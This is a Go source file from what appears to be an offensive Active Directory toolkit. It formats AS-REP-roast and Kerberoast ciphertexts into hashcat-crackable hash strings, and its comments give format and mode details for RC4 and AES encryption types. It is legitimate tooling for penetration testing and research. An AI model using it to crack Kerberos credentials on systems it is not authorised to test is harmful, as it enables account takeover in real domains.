// Package attacks provides the offensive-tooling surface built on the native
// Kerberos primitives: hashcat-compatible hash formatting for AS-REP roasting
// and Kerberoasting. The network operations live on the client
// (kerberos.ASREPRoast, KerberosClient.Kerberoast); this package turns their
// encrypted output into crackable hash strings.
package attacks

import (
	"encoding/hex"
	"fmt"
	"strings"

	"github.com/TheManticoreProject/Manticore/network/kerberos/v5/iana"
)

// aesMacLen returns the truncated-HMAC length appended by an AES enctype's
// encrypt-then/over-MAC construction, which is where the crackable checksum sits
// in the ciphertext for AES Kerberoast/AS-REP hashes.
func aesMacLen(etype int) int {
	switch etype {
	case iana.ETypeAES128CTSHMACSHA196, iana.ETypeAES256CTSHMACSHA196:
		return 12
	case iana.ETypeAES128CTSHMACSHA256:
		return 16
	case iana.ETypeAES256CTSHMACSHA384:
		return 24
	default:
		return 0
	}
}

// splitCipher separates a KDC-REP encrypted part into the checksum and the
// remaining encrypted data, as the hashcat formats expect.
//
//   - RC4-HMAC (23): the ciphertext is checksum(16) || edata, so the checksum is
//     the first 16 bytes.
//   - AES: the ciphertext is edata || HMAC, so the checksum is the trailing
//     12/16/24 bytes depending on the enctype.
func splitCipher(etype int, cipher []byte) (cksum, edata []byte, err error) {
	switch etype {
	case iana.ETypeRC4HMAC:
		if len(cipher) < 16 {
			return nil, nil, fmt.Errorf("attacks: RC4 ciphertext too short (%d bytes)", len(cipher))
		}
		return cipher[:16], cipher[16:], nil
	case iana.ETypeAES128CTSHMACSHA196, iana.ETypeAES256CTSHMACSHA196,
		iana.ETypeAES128CTSHMACSHA256, iana.ETypeAES256CTSHMACSHA384:
		m := aesMacLen(etype)
		if len(cipher) < m {
			return nil, nil, fmt.Errorf("attacks: AES ciphertext too short (%d bytes)", len(cipher))
		}
		return cipher[len(cipher)-m:], cipher[:len(cipher)-m], nil
	default:
		return nil, nil, fmt.Errorf("attacks: unsupported etype %d for hash formatting", etype)
	}
}

// FormatASREPHash formats an AS-REP encrypted part as a hashcat AS-REP-roast
// hash:
//
//   - RC4 (etype 23), mode 18200: "$krb5asrep$23$user@realm:<checksum>$<edata>".
//   - AES128 (etype 17), mode 32100, and AES256 (etype 18), mode 32200:
//     "$krb5asrep$<etype>$user$realm$<checksum>$<edata>", where the checksum is
//     the 12-byte truncated HMAC-SHA1 that ends the ciphertext.
//
// hashcat derives the AES string-to-key salt as the upper-cased realm followed by
// the user name. An account whose keys use another salt needs
// FormatASREPHashWithSalt with the salt the KDC reports: a computer account, whose
// salt is "<REALM>host<name>.<realm>", or a user renamed after its password was
// set. hashcat has no mode for the SHA-2 AES enctypes (19 and 20), so they are
// refused.
//
// hashcat splits these fields on '$', so an AES hash for a user name containing
// one cannot be loaded and is refused; FormatASREPHashJohn has the same layout
// limit, and FormatASREPHashWithSalt avoids it when the salt has no '$'.
func FormatASREPHash(username, realm string, etype int, cipher []byte) (string, error) {
	switch etype {
	case iana.ETypeRC4HMAC:
		cksum, edata, err := splitCipher(etype, cipher)
		if err != nil {
			return "", err
		}
		return fmt.Sprintf("$krb5asrep$23$%s@%s:%s$%s",
			username, realm, hex.EncodeToString(cksum), hex.EncodeToString(edata)), nil
	case iana.ETypeAES128CTSHMACSHA196, iana.ETypeAES256CTSHMACSHA196:
		if strings.Contains(username, "$") {
			return "", fmt.Errorf("attacks: hashcat cannot load an AES AS-REP hash whose user name %q contains '$'; "+
				"use FormatASREPHashWithSalt with the salt the KDC reported", username)
		}
		cksum, edata, err := splitASREPAES(etype, cipher)
		if err != nil {
			return "", err
		}
		return fmt.Sprintf("$krb5asrep$%d$%s$%s$%s$%s",
			etype, username, realm, hex.EncodeToString(cksum), hex.EncodeToString(edata)), nil
	default:
		return "", fmt.Errorf("attacks: hashcat has no AS-REP mode for etype %d; "+
			"it supports RC4 (23, mode 18200), AES128 (17, mode 32100) and AES256 (18, mode 32200)", etype)
	}
}

// FormatASREPHashWithSalt is FormatASREPHash for an account whose AES keys use the
// given string-to-key salt, such as the one the KDC reports in the AS-REP's
// PA-ETYPE-INFO2 (ASREPRoastResult.Salt).
//
// When salt is empty or is the default hashcat derives (upper-cased realm followed
// by the user name), the result is FormatASREPHash's. Otherwise, for etypes 17
// and 18, it is the salt-carrying form modes 32100 and 32200 also accept:
// "$krb5asrep$<etype>$<salt>$<edata>$<checksum>", which carries no user name, so it
// also serves accounts whose name contains '$' such as computer accounts. RC4 keys
// are unsalted, so an RC4 hash ignores salt.
func FormatASREPHashWithSalt(username, realm, salt string, etype int, cipher []byte) (string, error) {
	if salt == "" || salt == strings.ToUpper(realm)+username || etype == iana.ETypeRC4HMAC {
		return FormatASREPHash(username, realm, etype, cipher)
	}
	switch etype {
	case iana.ETypeAES128CTSHMACSHA196, iana.ETypeAES256CTSHMACSHA196:
		if strings.Contains(salt, "$") {
			return "", fmt.Errorf("attacks: hashcat cannot load an AES AS-REP hash whose salt %q contains '$'", salt)
		}
		cksum, edata, err := splitASREPAES(etype, cipher)
		if err != nil {
			return "", err
		}
		return fmt.Sprintf("$krb5asrep$%d$%s$%s$%s",
			etype, salt, hex.EncodeToString(edata), hex.EncodeToString(cksum)), nil
	default:
		return FormatASREPHash(username, realm, etype, cipher)
	}
}

// splitASREPAES splits an AES-SHA1 AS-REP ciphertext for modes 32100/32200. Those
// modes take at least 32 bytes of encrypted data (64 hex characters): the
// 16-byte confounder and a cipher block. A shorter ciphertext is not an AS-REP.
func splitASREPAES(etype int, cipher []byte) (cksum, edata []byte, err error) {
	cksum, edata, err = splitCipher(etype, cipher)
	if err != nil {
		return nil, nil, err
	}
	if len(edata) < 32 {
		return nil, nil, fmt.Errorf("attacks: AES AS-REP ciphertext too short (%d bytes of encrypted data)", len(edata))
	}
	return cksum, edata, nil
}

// FormatTGSHash formats a service ticket's encrypted part as a hashcat
// Kerberoast hash. RC4 (etype 23) yields the mode-13100 form
// "$krb5tgs$23$*account$realm$spn*$<checksum>$<edata>"; AES enctypes yield the
// mode-19600/19700 form "$krb5tgs$<etype>$account$realm$<checksum>$<edata>"
// (which carries no SPN, matching hashcat's format).
func FormatTGSHash(account, realm, spn string, etype int, cipher []byte) (string, error) {
	cksum, edata, err := splitCipher(etype, cipher)
	if err != nil {
		return "", err
	}
	if etype == iana.ETypeRC4HMAC {
		return fmt.Sprintf("$krb5tgs$23$*%s$%s$%s*$%s$%s",
			account, realm, spn, hex.EncodeToString(cksum), hex.EncodeToString(edata)), nil
	}
	return fmt.Sprintf("$krb5tgs$%d$%s$%s$%s$%s",
		etype, account, realm, hex.EncodeToString(cksum), hex.EncodeToString(edata)), nil
}
